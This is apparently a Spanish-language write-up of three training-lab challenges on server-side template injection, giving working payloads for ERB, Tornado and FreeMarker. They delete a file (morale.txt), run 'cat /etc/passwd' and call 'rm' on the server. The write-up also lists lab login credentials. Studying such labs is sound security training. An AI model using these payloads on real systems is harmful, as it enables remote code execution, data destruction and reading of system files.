## Reto 1: Inyección básica de plantillas del lado del servidor

Este laboratorio es vulnerable a la inyección de plantillas del lado del servidor debido a la construcción insegura de una plantilla ERB.

Para resolver el laboratorio, revise la documentación de ERB para descubrir cómo ejecutar código arbitrario y luego elimine el morale.txt archivo del directorio de inicio de Carlos. 

Aprovechamos una vulnerabilidad de Server-Side Template Injection (SSTI) en Ruby (ERB), donde la aplicación evalúa contenido enviado por el usuario sin validación. Mediante la sintaxis de plantillas de ERB, demostramos la ejecución de código del lado servidor, logrando eliminar un archivo del sistema con un simple payload.

```
GET /?message=<%= File.delete("morale.txt") %> HTTP/2
```

## Reto 2:  Inyección básica de plantillas del lado del servidor (contexto del código)

Este laboratorio es vulnerable a la inyección de plantillas del lado del servidor debido a la forma en que utiliza de forma insegura una plantilla de Tornado. Para resolver el laboratorio, revise la documentación de Tornado para descubrir cómo ejecutar código arbitrario y luego elimine el archivo. morale.txt  del directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

Esta vulnerabilidad de Server-Side Template Injection (SSTI) en el motor de plantillas Tornado. Mediante una combinación de sintaxis de plantillas y código Python embebido, conseguimos ejecutar comandos arbitrarios desde el servidor.

```
blog-post-author-display=user.first_name}}{%import os%}{{os.system('cat /etc/passwd')&csrf=CpgATskIw5lJLBFincXaqsU0jfeFGKA3
```

## Reto 3: Inyección de plantillas del lado del servidor mediante documentación

Este laboratorio es vulnerable a la inyección de plantillas del lado del servidor. Para solucionarlo, identifique el motor de plantillas y utilice la documentación para averiguar cómo ejecutar código arbitrario. Luego, elimine el morale.txt archivo del directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:
content-manager:C0nt3ntM4n4g3r

Analizando la documentación oficial, identificamos la función ‘new()‘ como vector de ataque para instanciar clases peligrosas, como Execute, que permite lanzar comandos del sistema.

```
Only <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")} left of ${product.name} at ${product.price}.</p>
```